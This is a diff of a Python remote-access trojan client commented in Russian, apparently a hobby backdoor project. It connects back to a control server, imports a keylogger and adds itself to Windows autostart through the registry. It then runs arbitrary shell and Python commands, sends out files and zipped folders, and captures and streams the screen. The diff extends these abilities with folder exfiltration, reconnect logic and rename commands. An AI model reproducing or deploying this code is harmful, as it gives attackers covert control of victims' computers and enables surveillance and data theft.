@@ -7,7 +7,7 @@ import re # Чтобы диски определить
 import threading
 import keylogger
 
-# persist
+# persist + рабта с каталогами
 import sys
 import shutil
 
@@ -25,6 +25,18 @@ import struct
 import pyautogui
 from PIL import Image
 
+####  Constants
+
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 5555
+
+QUIT = True
+DISCONNECT = False
+RECONNECT = 'reconnect'
+
+
+####   
+
 # Отправить ответ
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -33,9 +45,9 @@ def reliable_send(data):
 """
 # Если значение принимаемых данных выйдет за пределы 1024
 # То программа сломается
-    s.recv(1024)
-
-#  Следующая функция обходит это 
+#   s.recv(1024)
+#
+#  Следующая функция решает проблему 
 """
 def reliable_recv():
     data = ''
@@ -49,15 +61,26 @@ def reliable_recv():
         except ValueError:
             continue
 
-def upload_file(file_name):
+def upload(name):
     # Файл бинарный, поэтому нужно исп rb
-    f = open(file_name, 'rb')
-    s.send(f.read())
-    #f.close()
+    if (os.path.isdir(name)):
+        shutil.make_archive('archive_' + name, 'zip', name)
+        f = open('archive_' + name + '.zip', 'rb')
+        s.send(f.read())
+        f.close()
+        os.remove('archive_' + name + '.zip')
+    else:
+        f = open(name, 'rb')
+        s.send(f.read())
+        f.close()
 
-def download_file(file_name):
-    # Файл бинарный, поэтому нужно исп wb
-    f = open('download/' + file_name, 'wb')
+
+def download(object_type, name):
+    # Файл бинарный, поэтому нужно исп wb 
+    if (object_type == 'file'):
+        f = open(name, 'wb')
+    elif (object_type == 'folder'):
+        f = open(name + '.zip', 'wb')
     # Чтобы обнаржуить окончание загрузки файла
     # выставляем таймаут
     # Если файл закочится, цикл завершится
@@ -69,7 +92,7 @@ def download_file(file_name):
             chunk = s.recv(1024)
         except socket.timeout as e:
             break
-    # Выставялем timeout=None, чтобы не было пролем с другими функциями
+    # Выставялем timeout=None, чтобы не было проблем с другими функциями
     s.settimeout(None)
     f.close()
 
@@ -77,11 +100,10 @@ def screenshot():
     myscreenshot = pyautogui.screenshot()
     myscreenshot.save('screen.png')
 
-# Вызов: persistence Hacked program.exe
+# Вызов: persistence RDPython program.exe
 def persist(reg_name, copy_name):
     # Сохранить в папку User/AppData/Romaning (Windows)
     file_location = os.environ['appdata'] + "\\" + copy_name
-    # file_location = copy_name
     try:
         if not os.path.exists(file_location):
             # Добавляем в автозагруку (через регистры)
@@ -93,18 +115,19 @@ def persist(reg_name, copy_name):
     except:
         reliable_send('[-] Error Creating Persistence With The Target Machine')
 
-# Не уверен восстанавливается ли подключение, если оно пропало
-QUIT = True
-DISCONNECT = False
 def connection():
     global s
-    ip = '127.0.0.1'
-    port = 5555
+    global SERVER_IP
+    global SERVER_PORT
+    global QUIT
+    global DISCONNECT
+    global RECONNECT
+
     while True:
         time.sleep(5)
         try:
             # Адрес сервера к котрому подключаемся
-            s.connect((ip, port))
+            s.connect((SERVER_IP, SERVER_PORT))
             result = shell()
             # Если сервер отпраил команду Выход,
             # То выходим из цикла, 
@@ -122,22 +145,28 @@ def connection():
                 s.close()
                 time.sleep(20)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            elif result == RECONNECT:
+                s.close()
+                time.sleep(2)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         except:
             # Если много будет спать,
             # то, возможно, будет много рекурсивых вызовов
             connection()
 
-# Проблема:
-# Как выйти из цикла?
 def show_stream():
     global s
-    while True:
-        image = pyautogui.screenshot()
-        image = image.resize((1280, 720), Image.ANTIALIAS)
-        image = np.array(image)
-        img = Image.frombytes('RGB', (1280, 720), image)
-        data = pickle.dumps(np.array(img))
-        s.sendall(struct.pack("L", len(data)) + data)
+    try:
+        while True:
+            image = pyautogui.screenshot()
+            image = image.resize((1280, 720), Image.ANTIALIAS)
+            image = np.array(image)
+            img = Image.frombytes('RGB', (1280, 720), image)
+            data = pickle.dumps(np.array(img))
+            s.sendall(struct.pack("L", len(data)) + data)
+    except:
+        print('Stream was closed. Reconnecting...')
+        return RECONNECT
 
 def send_dir():
     dirs = []
@@ -154,19 +183,16 @@ def shell():
         command = reliable_recv()
         # Закрываем программу, если пришла команда quit
         if command == 'quit':
-            return True
+            return QUIT
         elif command == 'disconnect':
-            return False
-        # При получении следующей команды, мы не закроем программу на этой машине
-        # Но это нам позволит перейти в Command Center на галвной машине
+            return DISCONNECT        
         elif command == 'help':
             pass
         elif command == 'clear':
             pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
-            send_dir()
-            #reliable_send(",".join(os.listdir()))
+            send_dir()           #reliable_send(",".join(os.listdir()))
         elif command[:2] == 'ls':
             send_dir()
         elif command[:12] == 'create_file ':
@@ -180,18 +206,26 @@ def shell():
             os.mkdir(command[14:])
             send_dir()
         elif command[:14] == 'delete_folder ':
-            os.rmdir(command[14:])
+            #os.rmdir(command[14:])
+            shutil.rmtree(command[14:], ignore_errors=False, onerror=None)
             send_dir()
-        elif command[:7] == 'upload ':
-            download_file(command[7:])
-        elif command[:9] == 'download ':
-            upload_file(command[9:])
+        elif command[:12] == 'upload_file ':
+            download('file', command[12:])
+        elif command[:14] == 'upload_folder ':
+            download('folder', command[14:])
+        elif command[:14] == 'download_file ':
+            upload(command[14:])
+        elif command[:16] == 'download_folder ':
+            upload(command[16:])
         elif command[:10] == 'screenshot':
             screenshot()
-            upload_file('screen.png')
+            upload('screen.png')
             os.remove('screen.png')
-        elif command[:13] == 'screen_stream':
-            show_stream()
+        elif command[:13] == 'screen_stream':            
+            return show_stream()
+        elif command[:8] == 'rename=>':
+            os.rename(command.partition(' | ')[0][8:], command.partition(' | ')[2])
+            send_dir()
         elif command[:12] == 'python_exec ':
             result = exec(str(command[12:]))
             reliable_send('Success')
@@ -220,7 +254,6 @@ def shell():
             persist(reg_name, copy_name)
         else:
             try:
-                print('try 1')
                 execute = subprocess.Popen(command,
                                            shell=True,
                                            stdout=subprocess.PIPE,
@@ -228,6 +261,7 @@ def shell():
                                            stdin=subprocess.PIPE)
                 # Не работает на python 3
                 # result = execute.stdout.read() + execute.stderr.read()
+                # Альтернатива
                 out, err = execute.communicate()
                 reliable_send('Done<br>result: ' + out.decode() + '<br>errors: ' + err.decode())
             except:
